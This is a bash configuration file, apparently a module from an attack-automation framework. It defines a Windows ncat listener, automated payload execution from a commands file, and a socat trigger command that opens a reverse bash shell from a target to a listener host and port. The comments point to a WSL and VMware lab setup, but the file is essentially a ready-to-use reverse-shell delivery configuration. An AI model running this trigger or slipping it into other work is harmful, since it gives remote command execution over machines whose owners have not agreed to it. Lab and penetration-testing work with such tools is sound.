#!/usr/bin/env bash
# Windows-hosted ncat reverse shell listener with automated payload execution.
#
# Listener:
#   Runs on Windows via powershell.exe + ncat.exe
#
# Target:
#   Uses socat to establish a stable PTY reverse shell
#
# Notes:
#   - Intended for WSL controller environments where Linux nc listeners
#     are not reachable from VMware guest VMs.
#   - Requires:
#       Windows Nmap/ncat installed
#       socat installed on target
#   - Uses CRLF mode for cleaner PTY behavior.

TYPE="reverse_shell"

CONTROLLER="powershell"

AUTOMATED="true"

LHOST="${LHOST:-192.168.52.1}"
LPORT="${LPORT:-4445}"

LISTENER_START_DELAY="${LISTENER_START_DELAY:-2}"
SHELL_CONNECT_DELAY="${SHELL_CONNECT_DELAY:-4}"

POWERSHELL_EXE="${POWERSHELL_EXE:-powershell.exe}"

# Windows-hosted listener helper.
LISTENER_SCRIPT="../shared/listener.ps1"

# Stable PTY reverse shell.
TRIGGER_COMMAND="socat TCP:${LHOST}:${LPORT} EXEC:'/bin/bash',stderr"

# Optional transcript/output settings.
ENABLE_TRANSCRIPT="true"

# Payload execution source.
COMMANDS_FILE="${COMMANDS_FILE:-commands.txt}"

# Metadata
DELIVERY_NAME="windows_ncat_auto"
DELIVERY_FAMILY="reverse_shell"
DELIVERY_DESCRIPTION="Windows ncat listener with socat PTY reverse shell"
